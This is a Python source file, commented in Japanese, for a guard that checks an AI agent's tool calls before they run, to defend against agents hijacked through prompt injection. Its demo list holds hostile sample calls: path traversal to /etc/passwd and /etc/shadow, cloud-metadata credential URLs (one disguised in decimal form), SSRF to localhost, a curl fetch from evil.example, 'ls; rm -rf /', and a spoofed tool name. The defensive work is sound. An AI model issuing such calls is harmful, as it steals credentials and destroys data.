#!/usr/bin/env python3
"""agent_tool_guard: AIエージェントのツール呼び出しを、実行する前に検査するガード(予防層)。

プロンプトインジェクションでエージェントが乗っ取られると、エージェントは自分に与えられた正当な権限で、
攻撃者の望む操作(秘密ファイルの読み出し、クラウドのメタデータサービスへのアクセス、コマンド実行)を
してしまう(「Confused Deputy」問題)。LLMに「悪いことをしないで」と頼むのでは防げないため、LLMの
外側で、ツール呼び出しそのものを機械的に検査する。

検査すること(どれか1つでも引っかかれば拒否。迷う場合も拒否側に倒す):
  - 許可リストに無いツールは拒否(名前の似た偽ツール=シャドーツールの呼び出しを含む)。
  - 引数は、ツールごとの定義と完全に一致すること(不足・余分・型違いは拒否)。
  - パス: 作業フォルダの外を指すもの(../ 、絶対パス、別ドライブ、シンボリックリンクでの脱出)は拒否。
    作業フォルダ内でも、秘密情報らしいファイル(.env、鍵、認証情報)は人間の承認が必要。
  - URL: http/https以外は拒否。名前解決した全アドレスを調べ、クラウドのメタデータサービス
    (169.254.169.254 等。検知側は detections/ の R10)・リンクローカル・ループバック・プライベート
    アドレスは拒否(10進数表記など、見た目を変えたアドレスも名前解決後の値で判定)。名前解決に失敗
    したら拒否。
  - コマンド実行: シェルを通さない引数リストだけを受け付け、許可したプログラム以外は拒否。許可した
    プログラムでも、必ず人間の承認が必要。
  - 書き込み系: 必ず人間の承認が必要。承認する人がいない(非対話)場合は拒否。
すべての判断は、scripts/audit_log.py の改ざん検知つき監査ログに残せる。

正直な限界:
  - URLの検査は「検査した時点」の名前解決に基づく。検査後に名前の指す先を変える攻撃(DNSリバインディング)
    を防ぐには、実際の通信で、ここが返す検査済みアドレス(resolved)に接続先を固定する必要がある。
  - ガードは「何をするか」を見るもので、許可された操作の中身(読み出した内容をどこへ渡すか)までは
    追えない。最小権限の設計(必要なツールだけを渡す)と組み合わせて使う。

使い方:
    python scripts/agent_tool_guard.py --demo                       # 攻撃シナリオの実演
    python scripts/agent_tool_guard.py check '{"name":"read_file","arguments":"{\\"path\\":\\"README.md\\"}"}'
標準ライブラリだけで動く(Python 3.8 以上)。
"""
import argparse
import importlib.util
import ipaddress
import json
import os
import socket
import sys
from urllib.parse import urlsplit

HERE = os.path.dirname(os.path.abspath(__file__))
REPO_ROOT = os.path.dirname(HERE)

ALLOW, DENY, APPROVE = "allow", "deny", "needs_approval"

# 秘密情報らしいファイル名(作業フォルダ内でも、読むには人間の承認が必要)
SECRET_NAME_HINTS = (".env", "id_rsa", "id_ed25519", ".pem", ".key", ".p12", ".pfx", "credentials",
                     "secrets", ".netrc", ".npmrc", ".pypirc", "config.json")
# クラウドのメタデータサービス(R10と同じ対象)。IPは名前解決後にも判定する。
METADATA_HOSTS = {"metadata.google.internal", "metadata", "metadata.azure.com"}
METADATA_IPS = {ipaddress.ip_address("169.254.169.254"), ipaddress.ip_address("fd00:ec2::254"),
                ipaddress.ip_address("100.100.100.200")}

DEFAULT_TOOLS = {
    "read_file": {"params": {"path": "path"}, "risk": "low"},
    "list_dir": {"params": {"path": "path"}, "risk": "low"},
    "http_get": {"params": {"url": "url"}, "risk": "medium"},
    "write_file": {"params": {"path": "path", "content": "text"}, "risk": "high"},
    "run_command": {"params": {"argv": "argv"}, "risk": "high"},
}
DEFAULT_ALLOWED_PROGRAMS = ("git", "ls", "dir", "python", "python3")
MAX_TEXT = 100_000


class Decision:
    def __init__(self, action, reason, resolved=None):
        self.action, self.reason, self.resolved = action, reason, resolved or []

    def to_dict(self):
        d = {"action": self.action, "reason": self.reason}
        if self.resolved:
            d["resolved"] = self.resolved
        return d


class ToolGuard:
    def __init__(self, workspace=REPO_ROOT, tools=None, allowed_programs=DEFAULT_ALLOWED_PROGRAMS,
                 allow_private_urls=False, audit_path=None, resolver=None):
        self.workspace = os.path.realpath(workspace)
        self.tools = tools or DEFAULT_TOOLS
        self.allowed_programs = set(allowed_programs)
        self.allow_private_urls = allow_private_urls
        self.audit_path = audit_path
        self._resolver = resolver or self._resolve
        self._audit = None
        if audit_path:
            spec = importlib.util.spec_from_file_location("audit_log_guard", os.path.join(HERE, "audit_log.py"))
            self._audit = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(self._audit)

    # ---- 引数ごとの検査 ----
    def _check_path(self, value):
        if not isinstance(value, str) or not value or "\x00" in value:
            return Decision(DENY, "パスが文字列でない、空、またはNUL文字を含みます")
        target = os.path.realpath(os.path.join(self.workspace, value))
        try:
            inside = os.path.commonpath([self.workspace, target]) == self.workspace
        except ValueError:  # Windowsで別ドライブ同士を比べた場合
            inside = False
        if not inside:
            return Decision(DENY, "作業フォルダの外を指しています(%s)" % value)
        base = os.path.basename(target).lower()
        if any(h in base for h in SECRET_NAME_HINTS):
            return Decision(APPROVE, "秘密情報らしいファイルです(%s)。読むには人間の承認が必要です" % value)
        return Decision(ALLOW, "作業フォルダ内のパスです")

    @staticmethod
    def _resolve(host):
        infos = socket.getaddrinfo(host, None, proto=socket.IPPROTO_TCP)
        return sorted({info[4][0].split("%")[0] for info in infos})

    def _check_url(self, value):
        if not isinstance(value, str) or len(value) > 2048:
            return Decision(DENY, "URLが文字列でないか、長すぎます")
        parts = urlsplit(value)
        if parts.scheme not in ("http", "https"):
            return Decision(DENY, "http/https以外のスキーム(%s)は許可していません" % (parts.scheme or "なし"))
        host = (parts.hostname or "").rstrip(".").lower()
        if not host:
            return Decision(DENY, "URLにホスト名がありません")
        if parts.username or parts.password:
            return Decision(DENY, "URLに認証情報(user:pass@)が含まれています")
        if host in METADATA_HOSTS:
            return Decision(DENY, "クラウドのメタデータサービス(%s)へのアクセスです(R10の対象)" % host)
        try:
            addrs = self._resolver(host)
        except (OSError, UnicodeError) as e:
            return Decision(DENY, "名前解決できません(%s): %s" % (host, e))
        if not addrs:
            return Decision(DENY, "名前解決の結果が空です(%s)" % host)
        for a in addrs:
            ip = ipaddress.ip_address(a)
            if getattr(ip, "ipv4_mapped", None):
                ip = ip.ipv4_mapped
            if ip in METADATA_IPS:
                return Decision(DENY, "クラウドのメタデータサービス(%s → %s)へのアクセスです(R10の対象)" % (host, ip))
            if ip.is_link_local:
                return Decision(DENY, "リンクローカルアドレス(%s → %s)へのアクセスです" % (host, ip))
            if not self.allow_private_urls and (ip.is_loopback or ip.is_private or ip.is_reserved
                                                or ip.is_multicast or ip.is_unspecified):
                return Decision(DENY, "内部向けのアドレス(%s → %s)へのアクセスです(SSRFの可能性)" % (host, ip))
        return Decision(ALLOW, "外部の通常アドレスです(接続先はresolvedのアドレスに固定すること)", addrs)

    def _check_argv(self, value):
        if not isinstance(value, list) or not value or not all(isinstance(x, str) for x in value):
            return Decision(DENY, "コマンドは文字列のリスト(シェルを通さない形)で渡す必要があります")
        if any("\x00" in x or "\n" in x or "\r" in x for x in value):
            return Decision(DENY, "コマンドの引数にNUL・改行が含まれています")
        prog = os.path.basename(value[0]).lower()
        if prog.endswith(".exe"):
            prog = prog[:-4]
        if prog not in self.allowed_programs:
            return Decision(DENY, "許可していないプログラム(%s)です" % prog)
        return Decision(APPROVE, "コマンド実行(%s)は、必ず人間の承認が必要です" % " ".join(value)[:200])

    # ---- ツール呼び出し全体 ----
    def check(self, name, args):
        spec = self.tools.get(name)
        if spec is None:
            return Decision(DENY, "許可リストに無いツール(%s)です(偽のツールの可能性)" % name)
        if not isinstance(args, dict):
            return Decision(DENY, "引数がオブジェクト(辞書)ではありません")
        expected = spec["params"]
        if set(args) != set(expected):
            return Decision(DENY, "引数が定義と一致しません(期待 %s、実際 %s)" % (sorted(expected), sorted(args)))
        worst = Decision(ALLOW, "問題ありません")
        resolved = []
        for key, kind in expected.items():
            v = args[key]
            if kind == "path":
                d = self._check_path(v)
            elif kind == "url":
                d = self._check_url(v)
                resolved = d.resolved
            elif kind == "argv":
                d = self._check_argv(v)
            elif kind == "text":
                d = Decision(ALLOW, "") if isinstance(v, str) and len(v) <= MAX_TEXT else \
                    Decision(DENY, "テキストが文字列でないか、長すぎます")
            else:
                d = Decision(DENY, "未知の引数の種類です")
            if d.action == DENY:
                return d
            if d.action == APPROVE:
                worst = d
        if spec.get("risk") == "high" and worst.action == ALLOW:
            worst = Decision(APPROVE, "書き込み・実行系のツール(%s)は、必ず人間の承認が必要です" % name)
        worst.resolved = resolved or worst.resolved
        return worst

    def check_openai_call(self, call):
        """OpenAI形式のツール呼び出し {"name": ..., "arguments": "<JSON文字列>"} を検査する。"""
        name = call.get("name") if isinstance(call, dict) else None
        raw = call.get("arguments", "{}") if isinstance(call, dict) else None
        try:
            args = json.loads(raw) if isinstance(raw, str) else raw
        except ValueError:
            return name, None, Decision(DENY, "引数がJSONとして読めません")
        return name, args, self.check(name, args)

    def enforce(self, call, approver=None):
        """検査し、承認が必要なものは approver(name, args, reason)->bool に尋ねる。
        approver が無い(人がいない)場合は拒否する。最終判断を監査ログに残して返す。"""
        name, args, d = self.check_openai_call(call)
        final = d
        if d.action == APPROVE:
            ok = bool(approver and approver(name, args, d.reason))
            final = Decision(ALLOW if ok else DENY,
                             ("人間が承認しました: " if ok else "人間の承認が無いため拒否しました: ") + d.reason,
                             d.resolved)
        if self._audit:
            preview = json.dumps(args, ensure_ascii=False)[:300] if args is not None else None
            self._audit.append(self.audit_path, {"event": "tool_call", "tool": str(name)[:100], "args": preview,
                                                 "initial": d.action, "final": final.action,
                                                 "reason": final.reason[:300]})
        return final


DEMO_CALLS = [
    ("通常の読み出し", {"name": "read_file", "arguments": json.dumps({"path": "README.md"})}),
    ("作業フォルダの外(パストラバーサル)", {"name": "read_file", "arguments": json.dumps({"path": "../../etc/passwd"})}),
    ("絶対パス", {"name": "read_file", "arguments": json.dumps({"path": "/etc/shadow"})}),
    ("秘密情報らしいファイル", {"name": "read_file", "arguments": json.dumps({"path": ".env"})}),
    ("メタデータサービス(R10)", {"name": "http_get", "arguments": json.dumps(
        {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"})}),
    ("メタデータサービス(10進数表記で偽装)", {"name": "http_get", "arguments": json.dumps({"url": "http://2852039166/"})}),
    ("メタデータサービス(ホスト名)", {"name": "http_get", "arguments": json.dumps(
        {"url": "http://metadata.google.internal/computeMetadata/v1/"})}),
    ("内部アドレスへのSSRF", {"name": "http_get", "arguments": json.dumps({"url": "http://127.0.0.1:8766/scan/zgrab2"})}),
    ("file:スキーム", {"name": "http_get", "arguments": json.dumps({"url": "file:///etc/passwd"})}),
    ("許可リストに無い偽ツール", {"name": "read_fi1e", "arguments": json.dumps({"path": "README.md"})}),
    ("余分な引数(権限昇格の試み)", {"name": "read_file", "arguments": json.dumps({"path": "README.md", "as_admin": True})}),
    ("許可していないプログラム", {"name": "run_command", "arguments": json.dumps({"argv": ["curl", "http://evil.example/x.sh"]})}),
    ("シェル経由の実行(文字列)", {"name": "run_command", "arguments": json.dumps({"argv": "ls; rm -rf /"})}),
    ("許可したプログラム(承認が必要)", {"name": "run_command", "arguments": json.dumps({"argv": ["git", "status"]})}),
    ("ファイル書き込み(承認が必要)", {"name": "write_file", "arguments": json.dumps({"path": "notes.txt", "content": "x"})}),
    ("壊れた引数", {"name": "read_file", "arguments": "{not json"}),
]


def main():
    ap = argparse.ArgumentParser(description="AIエージェントのツール呼び出しを、実行前に検査するガード")
    sub = ap.add_subparsers(dest="cmd")
    c = sub.add_parser("check", help="OpenAI形式のツール呼び出し(JSON)を1件検査する")
    c.add_argument("call")
    ap.add_argument("--demo", action="store_true", help="攻撃シナリオを並べて実演する")
    ap.add_argument("--workspace", default=REPO_ROOT, help="作業フォルダ(既定: このリポジトリ)")
    ap.add_argument("--audit", default=os.path.join(REPO_ROOT, "results", "agent-guard", "audit.jsonl"),
                    help="監査ログの保存先")
    ap.add_argument("--interactive", action="store_true", help="承認が必要なものを、その場で人間に尋ねる")
    a = ap.parse_args()
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    guard = ToolGuard(workspace=a.workspace, audit_path=a.audit)

    def ask(name, args, reason):
        if not a.interactive:
            return False
        ans = input("承認しますか? %s %s\n  理由: %s [y/N]: " % (name, json.dumps(args, ensure_ascii=False), reason))
        return ans.strip().lower() == "y"

    if a.cmd == "check":
        try:
            call = json.loads(a.call)
        except ValueError:
            print("ツール呼び出しがJSONとして読めません", file=sys.stderr)
            return 2
        d = guard.enforce(call, ask)
        print(json.dumps(d.to_dict(), ensure_ascii=False, indent=2))
        return 0 if d.action == ALLOW else 1
    if a.demo:
        for label, call in DEMO_CALLS:
            d = guard.enforce(call, ask)
            mark = "許可" if d.action == ALLOW else "拒否"
            print("[%s] %-28s %s" % (mark, label, d.reason))
        print("\n監査ログ: %s(検証: python scripts/audit_log.py verify <このファイル>)" % a.audit)
        return 0
    ap.print_help()
    return 2


if __name__ == "__main__":
    sys.exit(main())
